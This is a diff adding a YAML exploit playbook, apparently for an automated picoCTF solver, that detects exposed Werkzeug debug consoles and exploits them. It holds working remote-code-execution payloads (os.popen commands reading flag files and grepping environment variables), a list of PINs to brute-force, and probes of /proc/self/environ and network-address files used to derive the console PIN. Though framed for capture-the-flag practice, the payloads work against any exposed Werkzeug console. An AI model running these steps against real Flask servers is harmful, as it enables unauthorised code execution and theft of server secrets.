@@ -1,0 +1,111 @@
+id: web_werkzeug_debug
+name: Werkzeug Debug Console RCE
+category: web
+version: "1.0"
+author: system
+description: >
+  Detects exposed Werkzeug debug console and exploits PIN bypass or brute-force
+  to achieve RCE. Common in Flask-based picoCTF challenges.
+
+applies_when:
+  - "context.challenge.type == 'web'"
+
+confidence_seeds:
+  - if: "'flask' in context.tech_stack or 'werkzeug' in context.tech_stack or 'python' in context.tech_stack"
+    boost: 0.35
+    label: "Flask/Werkzeug detected"
+  - if: "any(p in context.found_paths for p in ['/console', '/debug'])"
+    boost: 0.40
+    label: "Debug console path found"
+  - if: "'Werkzeug' in context.response_headers or 'werkzeug' in context.response_body"
+    boost: 0.30
+    label: "Werkzeug signature detected"
+
+detection:
+  min_confidence: 0.10
+  paths:
+    - id: werkzeug_console_check
+      name: "Werkzeug Console Detection"
+      steps:
+        - id: console_probe
+          action: http_probe
+          with:
+            payloads: ["/console", "/debug", "/__debug__"]
+            inject_into: path
+          signals:
+            - match: "Werkzeug|console.png|__debugger__|PIN"
+              on_match:
+                confidence_boost: 0.80
+                emit: werkzeug_console_found
+
+    - id: pin_bypass_check
+      name: "PIN Bypass Detection"
+      steps:
+        - id: check_pin_disabled
+          action: http_probe
+          with:
+            payloads: ["/__debugger__"]
+            inject_into: path
+          signals:
+            - match: "PIN.*disabled|No PIN required"
+              on_match:
+                confidence_boost: 0.90
+                emit: pin_disabled
+
+exploitation:
+  stop_on_flag: true
+  paths:
+    - id: no_pin_rce
+      name: "RCE Without PIN"
+      requires_signal: pin_disabled
+      technique: werkzeug_console_rce
+      steps:
+        - id: exec_commands
+          action: http_probe
+          with:
+            payloads:
+              - "__import__('os').popen('cat /flag.txt').read()"
+              - "__import__('os').popen('cat /flag').read()"
+              - "__import__('os').popen('cat /app/flag.txt').read()"
+              - "__import__('os').popen('cat flag.txt').read()"
+              - "__import__('os').popen('env | grep -i flag').read()"
+              - "__import__('os').popen('env | grep -i pico').read()"
+              - "__import__('os').popen('find / -name flag.txt 2>/dev/null').read()"
+            inject_into: console_exec
+          capture:
+            - pattern: 'picoCTF\\{[^}]+\\}'
+              as: flag_value
+            - pattern: 'flag\\{[^}]+\\}'
+              as: flag_value
+
+    - id: pin_bruteforce
+      name: "PIN Brute Force"
+      requires_signal: werkzeug_console_found
+      technique: werkzeug_pin_bruteforce
+      steps:
+        - id: common_pins
+          action: http_probe
+          with:
+            payloads: ["000-000-000", "123-456-789", "111-111-111", "000-000-001"]
+            inject_into: pin_field
+          signals:
+            - match: "Correct PIN|authenticated|success"
+              on_match:
+                confidence_boost: 0.95
+                emit: pin_cracked
+
+    - id: pin_generation_exploit
+      name: "PIN Generation Exploit"
+      requires_signal: werkzeug_console_found
+      technique: werkzeug_pin_calculation
+      steps:
+        - id: gather_pin_info
+          action: http_probe
+          with:
+            payloads: ["/proc/self/environ", "/proc/net/arp", "/sys/class/net/eth0/address"]
+            inject_into: path
+          signals:
+            - match: "[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}"
+              on_match:
+                confidence_boost: 0.60
+                emit: pin_info_leaked
